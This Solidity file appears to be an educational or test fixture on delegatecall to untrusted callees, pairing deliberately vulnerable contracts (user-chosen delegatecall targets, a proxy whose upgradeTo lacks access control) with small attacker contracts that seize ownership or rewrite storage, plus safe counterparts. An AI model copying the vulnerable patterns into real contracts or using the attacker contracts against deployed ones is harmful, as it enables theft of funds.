// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DelegatecallUntrusted
 * @dev Demonstrates delegatecall to untrusted address vulnerability
 *
 * delegatecall executes code in the caller's context. If the target
 * address is controlled by an attacker, they can manipulate the caller's storage,
 * steal funds, or destroy the contract.
 *
 * CWE-829: Inclusion of Functionality from Untrusted Control Sphere
 * SWC-112: Delegatecall to Untrusted Callee
 *
 * REAL-WORLD: Parity Wallet hack (2017) - $150M+ frozen due to delegatecall issue
 */

// VULNERABLE: Delegatecall to user-controlled address
contract VulnerableDelegatecall {
    address public owner;
    uint256 public balance;

    constructor() {
        owner = msg.sender;
    }

    // User can provide any address
    function execute(address target, bytes memory data) public payable {
        (bool success,) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    function deposit() public payable {
        balance += msg.value;
    }
}

// Attacker contract that can steal ownership
contract AttackerDelegatecall {
    address public owner;  // Same slot as VulnerableDelegatecall.owner (slot 0)
    uint256 public balance;  // Same slot as VulnerableDelegatecall.balance (slot 1)

    function pwn() public {
        owner = msg.sender;  // Overwrites victim's owner!
    }

    function steal() public {
        // After pwn(), attacker is owner and can drain funds
        selfdestruct(payable(msg.sender));
    }
}

// VULNERABLE: Proxy with unprotected upgrade function
contract VulnerableUpgradeableProxy {
    address public implementation;
    address public admin;

    constructor(address _implementation) {
        implementation = _implementation;
        admin = msg.sender;
    }

    // No access control on upgrade!
    function upgradeTo(address newImplementation) public {
        implementation = newImplementation;
    }

    fallback() external payable {
        address _impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// SAFE: Delegatecall to hardcoded trusted library
contract SafeDelegatecallToLibrary {
    address public owner;
    address public immutable TRUSTED_LIBRARY;

    constructor(address _library) {
        owner = msg.sender;
        TRUSTED_LIBRARY = _library;
    }

    // Only delegatecall to trusted, immutable address
    function execute(bytes memory data) public {
        require(msg.sender == owner, "Not owner");
        (bool success,) = TRUSTED_LIBRARY.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

// SAFE: Delegatecall with whitelist
contract SafeDelegatecallWithWhitelist {
    address public owner;
    mapping(address => bool) public trustedImplementations;

    constructor() {
        owner = msg.sender;
    }

    function addTrustedImplementation(address impl) public {
        require(msg.sender == owner, "Not owner");
        trustedImplementations[impl] = true;
    }

    function execute(address target, bytes memory data) public {
        require(msg.sender == owner, "Not owner");
        require(trustedImplementations[target], "Target not trusted");
        (bool success,) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }
}

// SAFE: Proper upgrade pattern with access control
contract SafeUpgradeableProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 private constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    constructor(address _implementation, address _admin) {
        assembly {
            sstore(IMPLEMENTATION_SLOT, _implementation)
            sstore(ADMIN_SLOT, _admin)
        }
    }

    modifier onlyAdmin() {
        address admin;
        assembly {
            admin := sload(ADMIN_SLOT)
        }
        require(msg.sender == admin, "Not admin");
        _;
    }

    function upgradeTo(address newImplementation) public onlyAdmin {
        assembly {
            sstore(IMPLEMENTATION_SLOT, newImplementation)
        }
    }

    fallback() external payable {
        assembly {
            let _impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// VULNERABLE: Arbitrary library call
contract VulnerableLibraryCall {
    mapping(address => uint256) public balances;

    // User controls library address and data
    function computeWithLibrary(address lib, bytes memory data) public returns (uint256) {
        (bool success, bytes memory result) = lib.delegatecall(data);
        require(success, "Library call failed");
        return abi.decode(result, (uint256));
    }
}

// Malicious library that can drain the contract
contract MaliciousLibrary {
    mapping(address => uint256) public balances;  // Same layout as VulnerableLibraryCall

    function computeAndSteal() public returns (uint256) {
        // Drain all balances to attacker
        balances[msg.sender] = address(this).balance;
        return 42;
    }
}
